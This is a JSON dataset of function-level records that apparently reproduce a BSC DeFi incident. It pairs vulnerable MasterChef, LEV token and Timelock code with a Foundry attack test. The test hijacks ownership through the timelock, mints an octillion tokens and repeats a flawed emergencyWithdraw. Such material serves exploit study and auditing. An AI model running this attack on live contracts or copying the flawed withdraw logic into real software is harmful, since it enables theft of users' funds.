[
  {
    "contract/interface": "IMasterChef",
    "source_type": "victim_contract",
    "function_name": "emergencyWithdraw",
    "original_code": "    function emergencyWithdraw(uint256 _pid) public {\n        PoolInfo storage pool = poolInfo[_pid];\n        UserInfo storage user = userInfo[_pid][msg.sender];\n        // if LEV pool burn syrup tokens\n        if (_pid == 0)\n            syrup.burn(msg.sender, user.amount);\n        user.amount = 0;\n        uint256 rewardDebt = user.rewardDebt;\n        user.rewardDebt = 0;\n        pool.lpToken.transfer(address(msg.sender), rewardDebt);\n        emit EmergencyWithdraw(msg.sender, _pid, rewardDebt);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMasterChef",
    "source_type": "victim_contract",
    "function_name": "leaveStaking",
    "original_code": "    function leaveStaking(uint256 _amount) public {\n        PoolInfo storage pool = poolInfo[0];\n        UserInfo storage user = userInfo[0][msg.sender];\n        require(user.amount >= _amount, \"withdraw: not good\");\n        updatePool(0);\n        withdrawPendingRewards(0);\n        if(_amount > 0) {\n            user.amount = user.amount - _amount;\n            pool.lpToken.transfer(address(msg.sender), _amount);\n        }\n        user.rewardDebt = user.amount * pool.accCakePerShare / 1e12;\n\n        syrup.burn(msg.sender, _amount);\n        emit Withdraw(msg.sender, 0, _amount);\n    }\n\n    // Withdraw without caring about rewards. EMERGENCY ONLY.\n",
    "description": ""
  },
  {
    "contract/interface": "IMasterChef",
    "source_type": "victim_contract",
    "function_name": "recoverLevOwnership",
    "original_code": "    function recoverLevOwnership() external onlyOwner {\n        lev.transferOwnership(msg.sender);\n    }\n}\n",
    "description": ""
  },
  {
    "contract/interface": "IMasterChef",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw(uint256 _pid, uint256 _amount) poolExists(_pid) public {\n\n        require (_pid != 0, 'withdraw CAKE by unstaking');\n        PoolInfo storage pool = poolInfo[_pid];\n        UserInfo storage user = userInfo[_pid][msg.sender];\n        require(user.amount >= _amount, \"withdraw: not good\");\n\n        updatePool(_pid);\n        withdrawPendingRewards(_pid);\n        if(_amount > 0) {\n            user.amount = user.amount - _amount;\n            pool.lpToken.transfer(address(msg.sender), _amount);\n        }\n        user.rewardDebt = user.amount * pool.accCakePerShare / 1e12;\n        emit Withdraw(msg.sender, _pid, _amount);\n    }\n\n    // Stake CAKE tokens to MasterChef\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 9_545_966); //fork bsc at block 9545967\n\n        vm.label(address(MasterChef), \"MasterChef\");\n        vm.label(address(LEV), \"LEV\");\n        vm.label(address(Timelock), \"Timelock\");\n        vm.label(address(Deployer), \"Deployer\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "test_Timelock",
    "original_code": "    function test_Timelock() public {\n        bytes memory Ownership_hijack =\n            (abi.encodePacked(bytes4(keccak256(bytes(\"transferOwnership(address)\"))), abi.encode(address(attacker))));\n\n        //Schedule a transaction from the Deployer current owner of timelock.\n        vm.startPrank(address(Deployer));\n\n        Timelock.schedule(\n            address(MasterChef),\n            0,\n            Ownership_hijack,\n            bytes32(0),\n            bytes32(0xf6ee06c6a62a6a42d1ad9d321d45c4f92a7a215509c850ee36fb025ba767a764),\n            172_800\n        );\n\n        //Validate that transaction is in timelock\n        bytes32 txHash = Timelock.hashOperation(\n            address(MasterChef),\n            0,\n            Ownership_hijack,\n            bytes32(0),\n            bytes32(0xf6ee06c6a62a6a42d1ad9d321d45c4f92a7a215509c850ee36fb025ba767a764)\n        );\n\n        assertTrue(Timelock.isOperationPending(txHash));\n\n        vm.roll(9_600_775);\n        vm.warp(block.timestamp + 172_800);\n\n        //Execute transaction and validate state is updated\n        Timelock.execute(\n            address(MasterChef),\n            0,\n            Ownership_hijack,\n            bytes32(0),\n            bytes32(0xf6ee06c6a62a6a42d1ad9d321d45c4f92a7a215509c850ee36fb025ba767a764)\n        );\n\n        assertTrue(Timelock.isOperationDone(txHash));\n        vm.stopPrank();\n\n        //attacker address recovers LEV MasterChef Contract and mints 1 Octillion tokens\n        vm.startPrank(address(attacker));\n        MasterChef.recoverLevOwnership();\n        LEV.mint(address(attacker), 100_000_000_000_000_000_000_000_000);\n        vm.stopPrank();\n\n        //Typical user1 tries to leave staking but gets revert error\n        vm.expectRevert();\n        vm.startPrank(address(user1));\n        MasterChef.leaveStaking(10_000);\n\n        //Same user1 tries to withdraw but gets another revert error\n        vm.expectRevert();\n        MasterChef.withdraw(3, 272_356_000_000_000_000_000_000);\n        vm.stopPrank();\n\n        //user2 does emergency withdraw and succeeds\n        vm.startPrank(address(user2));\n        MasterChef.emergencyWithdraw(4);\n        vm.stopPrank();\n\n        //user2 does another emergency withdraw and succeeds again.(Its actually user 3/4 that abused the emergencyWithdraw() vulnerability)\n        vm.startPrank(address(user2));\n        MasterChef.emergencyWithdraw(4);\n        vm.stopPrank();\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ILEV",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "    function mint(address receiver, uint256 amount) override external onlyOwner {\n        _mint(receiver, amount);\n    }\n}\n",
    "description": ""
  },
  {
    "contract/interface": "ITimelock",
    "source_type": "victim_contract",
    "function_name": "execute",
    "original_code": "    function execute(address target, uint256 value, bytes calldata data, bytes32 predecessor, bytes32 salt) public payable virtual onlyRole(EXECUTOR_ROLE) {\n        bytes32 id = hashOperation(target, value, data, predecessor, salt);\n        _beforeCall(predecessor);\n        _call(id, 0, target, value, data);\n        _afterCall(id);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ITimelock",
    "source_type": "victim_contract",
    "function_name": "hashOperation",
    "original_code": "    function hashOperation(address target, uint256 value, bytes calldata data, bytes32 predecessor, bytes32 salt) public pure virtual returns (bytes32 hash) {\n        return keccak256(abi.encode(target, value, data, predecessor, salt));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ITimelock",
    "source_type": "victim_contract",
    "function_name": "isOperationDone",
    "original_code": "    function isOperationDone(bytes32 id) public view virtual returns (bool done) {\n        return getTimestamp(id) == _DONE_TIMESTAMP;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ITimelock",
    "source_type": "victim_contract",
    "function_name": "isOperationPending",
    "original_code": "    function isOperationPending(bytes32 id) public view virtual returns (bool pending) {\n        return getTimestamp(id) > _DONE_TIMESTAMP;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ITimelock",
    "source_type": "victim_contract",
    "function_name": "schedule",
    "original_code": "    function schedule(address target, uint256 value, bytes calldata data, bytes32 predecessor, bytes32 salt, uint256 delay) public virtual onlyRole(PROPOSER_ROLE) {\n        bytes32 id = hashOperation(target, value, data, predecessor, salt);\n        _schedule(id, delay);\n        emit CallScheduled(id, 0, target, value, data, predecessor, delay);\n    }\n\n",
    "description": ""
  }
]